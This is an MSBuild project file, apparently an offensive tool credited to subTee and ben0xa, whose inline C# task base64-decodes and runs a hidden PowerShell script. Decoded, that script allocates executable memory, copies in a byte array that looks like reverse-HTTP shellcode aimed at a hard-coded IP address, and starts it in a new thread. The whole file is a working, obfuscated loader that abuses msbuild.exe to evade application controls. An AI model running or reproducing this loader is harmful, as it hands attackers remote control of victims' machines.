<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes c# code. -->
  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe nps.xml -->
  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->
  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->
  <!-- License: BSD 3-Clause -->
  <Target Name="npscsharp">
   <nps />
  </Target>
  <UsingTask
    TaskName="nps"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task>
    <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[

          using System;
      using System.Collections.ObjectModel;
      using System.Management.Automation;
      using System.Management.Automation.Runspaces;
      using Microsoft.Build.Framework;
      using Microsoft.Build.Utilities;

      public class nps : Task, ITask
        {
            public override bool Execute()
            {
              string cmd = "JEJhYkdjcklSdEVzcnlrTCA9IEAiDQpbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBWaXJ0dWFsQWxsb2MoSW50UHRyIGxwQWRkcmVzcywgdWludCBkd1NpemUsIHVpbnQgZmxBbGxvY2F0aW9uVHlwZSwgdWludCBmbFByb3RlY3QpOw0KW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildDQpwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlVGhyZWFkKEludFB0ciBscFRocmVhZEF0dHJpYnV0ZXMsIHVpbnQgZHdTdGFja1NpemUsIEludFB0ciBscFN0YXJ0QWRkcmVzcywgSW50UHRyIGxwUGFyYW1ldGVyLCB1aW50IGR3Q3JlYXRpb25GbGFncywgSW50UHRyIGxwVGhyZWFkSWQpOw0KIkANCg0KJGRseExHYUhCS1EgPSBBZGQtVHlwZSAtbWVtYmVyRGVmaW5pdGlvbiAkQmFiR2NySVJ0RXNyeWtMIC1OYW1lICJXaW4zMiIgLW5hbWVzcGFjZSBXaW4zMkZ1bmN0aW9ucyAtcGFzc3RocnUNCg0KW0J5dGVbXV0gJFZVVXBrV0pCRUR0SElTID0gMHhmYywweGU4LDB4ODIsMHgwLDB4MCwweDAsMHg2MCwweDg5LDB4ZTUsMHgzMSwweGMwLDB4NjQsMHg4YiwweDUwLDB4MzAsMHg4YiwweDUyLDB4YywweDhiLDB4NTIsMHgxNCwweDhiLDB4NzIsMHgyOCwweGYsMHhiNywweDRhLDB4MjYsMHgzMSwweGZmLDB4YWMsMHgzYywweDYxLDB4N2MsMHgyLDB4MmMsMHgyMCwweGMxLDB4Y2YsMHhkLDB4MSwweGM3LDB4ZTIsMHhmMiwweDUyLDB4NTcsMHg4YiwweDUyLDB4MTAsMHg4YiwweDRhLDB4M2MsMHg4YiwweDRjLDB4MTEsMHg3OCwweGUzLDB4NDgsMHgxLDB4ZDEsMHg1MSwweDhiLDB4NTksMHgyMCwweDEsMHhkMywweDhiLDB4NDksMHgxOCwweGUzLDB4M2EsMHg0OSwweDhiLDB4MzQsMHg4YiwweDEsMHhkNiwweDMxLDB4ZmYsMHhhYywweGMxLDB4Y2YsMHhkLDB4MSwweGM3LDB4MzgsMHhlMCwweDc1LDB4ZjYsMHgzLDB4N2QsMHhmOCwweDNiLDB4N2QsMHgyNCwweDc1LDB4ZTQsMHg1OCwweDhiLDB4NTgsMHgyNCwweDEsMHhkMywweDY2LDB4OGIsMHhjLDB4NGIsMHg4YiwweDU4LDB4MWMsMHgxLDB4ZDMsMHg4YiwweDQsMHg4YiwweDEsMHhkMCwweDg5LDB4NDQsMHgyNCwweDI0LDB4NWIsMHg1YiwweDYxLDB4NTksMHg1YSwweDUxLDB4ZmYsMHhlMCwweDVmLDB4NWYsMHg1YSwweDhiLDB4MTIsMHhlYiwweDhkLDB4NWQsMHg2OCwweDZlLDB4NjUsMHg3NCwweDAsMHg2OCwweDc3LDB4NjksMHg2ZSwweDY5LDB4NTQsMHg2OCwweDRjLDB4NzcsMHgyNiwweDcsMHhmZiwweGQ1LDB4MzEsMHhkYiwweDUzLDB4NTMsMHg1MywweDUzLDB4NTMsMHg2OCwweDNhLDB4NTYsMHg3OSwweGE3LDB4ZmYsMHhkNSwweDUzLDB4NTMsMHg2YSwweDMsMHg1MywweDUzLDB4NjgsMHhiYiwweDEsMHgwLDB4MCwweGU4LDB4MywweDEsMHgwLDB4MCwweDJmLDB4NTQsMHg0YiwweDQ1LDB4NjEsMHg2ZSwweDZhLDB4MzEsMHg1YSwweDcyLDB4NGQsMHg0YywweDcyLDB4NjYsMHg0ZiwweDcwLDB4MzksMHg3MywweDQyLDB4NTIsMHgzOSwweDZkLDB4NDEsMHg0NywweDZhLDB4NTksMHg1MCwweDU2LDB4NmEsMHg2NiwweDVmLDB4MzAsMHg2MiwweDcwLDB4NDcsMHg0NSwweDY2LDB4NmEsMHg2NiwweDMzLDB4NGQsMHg0YywweDRmLDB4NTgsMHg0NSwweDUxLDB4NGEsMHg1NiwweDM5LDB4NGUsMHg3OCwweDQ1LDB4NTcsMHg0OCwweDZiLDB4NjQsMHg1OCwweDRmLDB4NTYsMHg1MiwweDUxLDB4NDUsMHg1ZiwweDMxLDB4NDEsMHg0MywweDY5LDB4NjEsMHg2NSwweDY3LDB4NzUsMHg1NiwweDRjLDB4MzMsMHg2NSwweDM4LDB4MzUsMHg0YywweDUzLDB4NzEsMHg0OSwweDQ5LDB4MzcsMHgyZCwweDRjLDB4NjEsMHg3MiwweDZjLDB4NjYsMHg2NSwweDcyLDB4NTMsMHg0MiwweDY3LDB4MmQsMHg3MywweDM3LDB4MzQsMHg2MSwweDY3LDB4NzEsMHg3MSwweDU0LDB4NWEsMHg1MSwweDU0LDB4NmIsMHg0YiwweDU1LDB4MzksMHgzNywweDQ1LDB4NDksMHgzMSwweDM2LDB4MCwweDUwLDB4NjgsMHg1NywweDg5LDB4OWYsMHhjNiwweGZmLDB4ZDUsMHg4OSwweGM2LDB4NTMsMHg2OCwweDAsMHgzMiwweGUwLDB4ODQsMHg1MywweDUzLDB4NTMsMHg1NywweDUzLDB4NTYsMHg2OCwweGViLDB4NTUsMHgyZSwweDNiLDB4ZmYsMHhkNSwweDk2LDB4NmEsMHhhLDB4NWYsMHg2OCwweDgwLDB4MzMsMHgwLDB4MCwweDg5LDB4ZTAsMHg2YSwweDQsMHg1MCwweDZhLDB4MWYsMHg1NiwweDY4LDB4NzUsMHg0NiwweDllLDB4ODYsMHhmZiwweGQ1LDB4NTMsMHg1MywweDUzLDB4NTMsMHg1NiwweDY4LDB4MmQsMHg2LDB4MTgsMHg3YiwweGZmLDB4ZDUsMHg4NSwweGMwLDB4NzUsMHgxNCwweDY4LDB4ODgsMHgxMywweDAsMHgwLDB4NjgsMHg0NCwweGYwLDB4MzUsMHhlMCwweGZmLDB4ZDUsMHg0ZiwweDc1LDB4Y2QsMHhlOCwweDRhLDB4MCwweDAsMHgwLDB4NmEsMHg0MCwweDY4LDB4MCwweDEwLDB4MCwweDAsMHg2OCwweDAsMHgwLDB4NDAsMHgwLDB4NTMsMHg2OCwweDU4LDB4YTQsMHg1MywweGU1LDB4ZmYsMHhkNSwweDkzLDB4NTMsMHg1MywweDg5LDB4ZTcsMHg1NywweDY4LDB4MCwweDIwLDB4MCwweDAsMHg1MywweDU2LDB4NjgsMHgxMiwweDk2LDB4ODksMHhlMiwweGZmLDB4ZDUsMHg4NSwweGMwLDB4NzQsMHhjZiwweDhiLDB4NywweDEsMHhjMywweDg1LDB4YzAsMHg3NSwweGU1LDB4NTgsMHhjMywweDVmLDB4ZTgsMHg2YiwweGZmLDB4ZmYsMHhmZiwweDMxLDB4MzAsMHgyZSwweDMxLDB4MzIsMHgzNCwweDJlLDB4MzIsMHgzMSwweDJlLDB4MzEsMHgzNSwweDM3LDB4MCwweGJiLDB4ZjAsMHhiNSwweGEyLDB4NTYsMHg2YSwweDAsMHg1MywweGZmLDB4ZDUNCg0KDQokUWF6dVVuUkQgPSAkZGx4TEdhSEJLUTo6VmlydHVhbEFsbG9jKDAsW01hdGhdOjpNYXgoJFZVVXBrV0pCRUR0SElTLkxlbmd0aCwweDEwMDApLDB4MzAwMCwweDQwKQ0KDQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRWVVVwa1dKQkVEdEhJUywwLCRRYXp1VW5SRCwkVlVVcGtXSkJFRHRISVMuTGVuZ3RoKQ0KDQokZGx4TEdhSEJLUTo6Q3JlYXRlVGhyZWFkKDAsMCwkUWF6dVVuUkQsMCwwLDApDQpmb3IgKDs7KXsKICBTdGFydC1zbGVlcCA2MAp9";

                PowerShell ps = PowerShell.Create();
                ps.AddScript(Base64Decode(cmd));

                Collection<PSObject> output = null;
                try
                {
                    output = ps.Invoke();
                }
                catch(Exception e)
                {
                    Console.WriteLine("Error while executing the script.\r\n" + e.Message.ToString());
                }
                if (output != null)
                {
                    foreach (PSObject rtnItem in output)
                    {
                        Console.WriteLine(rtnItem.ToString());
                    }
                }
                return true;
            }

            public static string Base64Encode(string text) {
           return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
        }

        public static string Base64Decode(string encodedtext) {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
        }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>